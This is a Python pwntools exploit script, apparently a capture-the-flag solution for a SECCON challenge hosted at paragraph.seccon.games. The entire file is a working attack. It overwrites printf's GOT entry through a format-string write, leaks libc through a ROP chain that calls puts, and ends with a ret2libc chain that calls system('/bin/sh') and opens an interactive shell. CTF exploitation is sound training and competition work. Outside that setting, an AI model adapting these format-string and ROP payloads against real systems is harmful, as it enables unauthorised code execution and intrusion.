from pwn import *
from icecream import ic

elf = exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("paragraph.seccon.games", 5000)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x00000000004011fa
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

# payload = b'%6$p'
payload = fmtstr_payload(6, {elf.got['printf']: elf.plt['__isoc99_scanf']}, write_size='long')[:-1]

sl(payload)

payload = b'a'*0x28
payload += p64(gad(elf, ['ret']))
payload += p64(qgad(elf, 'rdi'))
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(gad(elf, ['ret']))
payload += p64(elf.sym['main'])
sla(b"a(@@", b"answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted " + payload + b" warmly.\n")
sl(b'aa')

libc.address = uu64(6) - libc.sym['puts']

ic(hex(libc.address))

payload = b'a'*0x28
payload += p64(gad(elf, ['ret']))
payload += p64(qgad(elf, 'rdi'))
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(libc.sym['system'])

sl(b"answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted " + payload + b" warmly.\n")
sl(b"aa")

io.interactive()
